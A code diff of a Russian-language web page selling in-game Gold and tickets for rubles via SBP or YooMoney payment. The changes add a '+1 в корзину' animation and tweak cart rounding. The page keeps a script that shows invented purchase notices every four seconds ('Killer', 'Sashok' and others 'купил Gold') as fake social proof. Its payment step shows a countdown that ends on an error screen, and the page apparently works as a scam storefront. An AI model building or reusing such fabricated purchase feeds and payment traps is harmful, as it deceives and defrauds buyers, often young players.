@@ -22,7 +22,7 @@
         .header h1 { margin: 0; font-size: 1.1rem; letter-spacing: 2px; text-transform: uppercase; color: var(--accent); }
 
         .tabs { display: flex; justify-content: center; gap: 5px; margin: 10px 0; padding: 0 10px; }
-        .tab-btn { background: var(--card); border: 1px solid #444; color: #888; padding: 8px; border-radius: 6px; cursor: pointer; text-transform: uppercase; font-size: 0.6rem; flex: 1; text-align: center; }
+        .tab-btn { background: var(--card); border: 1px solid #444; color: #888; padding: 8px; border-radius: 6px; cursor: pointer; text-transform: uppercase; font-size: 0.6rem; flex: 1; text-align: center; transition: 0.3s; }
         .tab-btn.active { border-color: var(--accent); color: white; background: rgba(255, 140, 0, 0.2); }
 
         .container { max-width: 450px; margin: 0 auto; padding: 0 10px; height: 60vh; overflow-y: auto; scrollbar-width: none; }
@@ -34,19 +34,17 @@
         .services { display: none; grid-template-columns: 1fr; gap: 8px; }
         .services.active { display: grid; }
         
-        .option { background: var(--card); border: 1px solid rgba(255,255,255,0.05); padding: 14px; border-radius: 10px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; transition: 0.2s; }
+        .option { background: var(--card); border: 1px solid rgba(255,255,255,0.05); padding: 14px; border-radius: 10px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; transition: 0.2s; position: relative; }
         .option:active { transform: scale(0.97); }
-        .option h3 { margin: 0; font-size: 0.9rem; }
         .price { color: var(--accent); font-weight: 800; font-size: 1rem; }
 
+        /* АНИМАЦИЯ +1 */
+        .fly-text { position: absolute; color: var(--success); font-weight: bold; font-size: 0.9rem; pointer-events: none; z-index: 5000; animation: flyUp 0.8s ease-out forwards; }
+        @keyframes flyUp { from { opacity: 1; transform: translateY(0); } to { opacity: 0; transform: translateY(-50px); } }
+
+        /* ЛЕНТА */
         .live-feed { position: fixed; bottom: 90px; left: 15px; width: 180px; z-index: 1000; pointer-events: none; }
-        .feed-item { 
-            background: rgba(10, 10, 15, 0.98); border-left: 3px solid var(--accent); 
-            padding: 5px 10px; border-radius: 4px; font-size: 0.6rem; margin-top: 5px; 
-            display: flex; align-items: center; justify-content: space-between; 
-            box-shadow: 0 4px 10px rgba(0,0,0,0.5); opacity: 0; transform: translateX(-20px);
-            transition: opacity 0.4s, transform 0.4s;
-        }
+        .feed-item { background: rgba(10, 10, 15, 0.98); border-left: 3px solid var(--accent); padding: 5px 10px; border-radius: 4px; font-size: 0.6rem; margin-top: 5px; display: flex; align-items: center; justify-content: space-between; opacity: 0; transform: translateX(-20px); transition: 0.4s; }
         .feed-item.show { opacity: 1; transform: translateX(0); }
 
         .cart-toggle { position: fixed; top: 15px; right: 15px; background: var(--accent); color: black; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; cursor: pointer; z-index: 2000; }
@@ -61,7 +59,6 @@
         
         .locked-info { text-align: center; padding: 30px 10px; background: rgba(0,0,0,0.4); border-radius: 12px; border: 1px dashed var(--danger); margin-top: 10px; }
         .locked-info h2 { color: var(--danger); font-size: 0.9rem; margin-bottom: 5px; }
-        .locked-info p { font-size: 0.7rem; color: #888; }
     </style>
 </head>
 <body>
@@ -79,29 +76,26 @@
     <div class="user-input-box">
         <input type="number" id="user_id" placeholder="ID Игрока">
         <div style="display:flex; gap:5px;">
-            <input type="text" id="promo_input" placeholder="Промокод" style="margin:0">
-            <button onclick="applyPromo()" style="background:var(--accent); border:none; padding:0 12px; border-radius:6px; font-weight:bold; cursor:pointer; font-size:0.7rem;">OK</button>
+            <input type="text" id="promo_input" placeholder="Промокод">
+            <button onclick="applyPromo()" style="background:var(--accent); border:none; padding:0 12px; border-radius:6px; font-weight:bold; cursor:pointer;">OK</button>
         </div>
         <div id="active-promos" style="font-size: 0.6rem; color: var(--success); margin-top: 4px;"></div>
     </div>
 
     <div id="gold" class="services active">
-        <div class="option" onclick="addToCart('100 Gold', 89)"><h3>100 Gold</h3><div class="price">89 ₽</div></div>
-        <div class="option" onclick="addToCart('500 Gold', 379)"><h3>500 Gold</h3><div class="price">379 ₽</div></div>
-        <div class="option" onclick="addToCart('1000 Gold', 729)"><h3>1000 Gold</h3><div class="price">729 ₽</div></div>
-        <div class="option" onclick="addToCart('3000 Gold', 1599)"><h3>3000 Gold</h3><div class="price">1599 ₽</div></div>
+        <div class="option" onclick="addToCart(event, '100 Gold', 89)"><h3>100 Gold</h3><div class="price">89 ₽</div></div>
+        <div class="option" onclick="addToCart(event, '500 Gold', 379)"><h3>500 Gold</h3><div class="price">379 ₽</div></div>
+        <div class="option" onclick="addToCart(event, '1000 Gold', 729)"><h3>1000 Gold</h3><div class="price">729 ₽</div></div>
+        <div class="option" onclick="addToCart(event, '3000 Gold', 1599)"><h3>3000 Gold</h3><div class="price">1599 ₽</div></div>
     </div>
 
     <div id="tickets" class="services">
-        <div class="option" onclick="addToCart('100 Билетов', 89)"><h3>100 Билетов</h3><div class="price">89 ₽</div></div>
-        <div class="option" onclick="addToCart('500 Билетов', 369)"><h3>500 Билетов</h3><div class="price">369 ₽</div></div>
+        <div class="option" onclick="addToCart(event, '100 Билетов', 89)"><h3>100 Билетов</h3><div class="price">89 ₽</div></div>
+        <div class="option" onclick="addToCart(event, '500 Билетов', 369)"><h3>500 Билетов</h3><div class="price">369 ₽</div></div>
     </div>
 
     <div id="pass" class="services">
-        <div class="locked-info">
-            <h2>РАЗДЕЛ ЗАКРЫТ</h2>
-            <p>Технические работы. Доступ появится в следующем обновлении.</p>
-        </div>
+        <div class="locked-info"><h2>РАЗДЕЛ ЗАКРЫТ</h2><p>Технические работы.</p></div>
     </div>
 </div>
 
@@ -114,7 +108,7 @@
                 <span>Итого:</span><b id="total-price" style="color:var(--accent)">0 ₽</b>
             </div>
             <button class="pay-btn" onclick="goToPay()">ОПЛАТИТЬ ПО СБП <img src="https://upload.wikimedia.org" width="25" style="filter:brightness(0)"></button>
-            <button onclick="toggleCart()" style="width:100%; background:none; border:none; color:#555; margin-top:10px; font-size:0.7rem; cursor:pointer;">Закрыть</button>
+            <button onclick="toggleCart()" style="width:100%; background:none; border:none; color:#555; margin-top:10px; cursor:pointer;">Закрыть</button>
         </div>
         <div id="step-waiting" style="display:none; flex-direction:column; align-items:center; justify-content:center; flex:1; text-align:center;">
             <div class="loader"></div>
@@ -137,7 +131,7 @@
     const yoomoney = "https://yoomoney.ru";
 
     function roundToNine(num) {
-        if (num === 0) return 0;
+        if (num <= 0) return 0;
         return Math.floor(num / 10) * 10 + 9;
     }
 
@@ -148,8 +142,18 @@
         document.getElementById(id).classList.add('active');
     }
 
-    function addToCart(name, price) {
+    function addToCart(event, name, price) {
         if(!document.getElementById('user_id').value) return alert("Введите ID!");
+        
+        // Анимация +1
+        const fly = document.createElement('div');
+        fly.className = 'fly-text';
+        fly.innerText = '+1 в корзину';
+        fly.style.left = event.clientX + 'px';
+        fly.style.top = event.clientY + 'px';
+        document.body.appendChild(fly);
+        setTimeout(() => fly.remove(), 800);
+
         cart.push({name, price});
         updateCart();
     }
@@ -158,9 +162,9 @@
         document.getElementById('cart-count').innerText = cart.length;
         const list = document.getElementById('cart-list');
         list.innerHTML = cart.map(i => `<div style="display:flex; justify-content:space-between; margin-bottom:5px;"><span>${i.name}</span><b>${roundToNine(i.price)} ₽</b></div>`).join('');
-        let total = cart.reduce((s, i) => s + i.price, 0);
-        if(discount) total = total * (1 - discount);
-        document.getElementById('total-price').innerText = roundToNine(total) + " ₽";
+        let rawTotal = cart.reduce((s, i) => s + i.price, 0);
+        if(discount) rawTotal *= (1 - discount);
+        document.getElementById('total-price').innerText = roundToNine(rawTotal) + " ₽";
     }
 
     function toggleCart() {
@@ -185,26 +189,19 @@
         const interval = setInterval(() => {
             let m = Math.floor(t / 60), s = t % 60;
             document.getElementById('timer-text').innerText = `${m < 10 ? '0'+m:m}:${s < 10 ? '0'+s:s}`;
-            if(--t < 0) {
-                clearInterval(interval);
-                document.getElementById('step-waiting').style.display = 'none';
-                document.getElementById('step-error').style.display = 'flex';
-            }
+            if(--t < 0) { clearInterval(interval); document.getElementById('step-waiting').style.display = 'none'; document.getElementById('step-error').style.display = 'flex'; }
         }, 1000);
     }
 
     setInterval(() => {
         const feed = document.getElementById('live-feed');
-        const names = ["Killer", "Admin", "Top_G", "Sashok", "Vortex", "Legenda"];
+        const names = ["Killer", "Admin", "Mortal", "Sashok", "Vortex", "Legenda"];
         const el = document.createElement('div');
         el.className = 'feed-item';
         el.innerHTML = `<span><b>${names[Math.floor(Math.random()*names.length)]}</b> купил Gold</span> <span style="color:var(--success)">✔</span>`;
         feed.appendChild(el);
         setTimeout(() => el.classList.add('show'), 100);
-        setTimeout(() => {
-            el.classList.remove('show');
-            setTimeout(() => el.remove(), 500);
-        }, 2000);
+        setTimeout(() => { el.classList.remove('show'); setTimeout(() => el.remove(), 500); }, 2000);
     }, 4000);
 </script>
 
